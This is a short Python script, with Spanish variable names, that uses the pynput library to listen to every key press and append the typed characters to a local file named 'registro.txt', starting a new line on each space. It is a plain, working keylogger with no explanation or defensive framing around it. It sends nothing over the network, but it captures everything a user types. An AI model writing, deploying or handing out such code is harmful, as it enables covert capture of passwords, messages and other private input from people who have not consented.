from pynput.keyboard import Key, Listener

archivo_de_registro = "registro.txt"
keys = []
count = 0

def onPress(key):
    global keys, count
    
    keys.append(key)
    count = count +1 
    
    if count >= 1:
        writter(keys)
        keys = []
        count = 0
        
def writter(pulsaciones):
    with open(archivo_de_registro,'a') as registro:
        for i in pulsaciones:
            words = str(i).replace("'", "")
            
            if words.find("space") > 0:
                registro.write('\n')
                registro.close()
                
            elif words.find("key") == -1:
                registro.write(words)
                registro.close()
                
if __name__ == '__main__':
    
    with Listener(on_press = onPress) as l:
        l.join()
        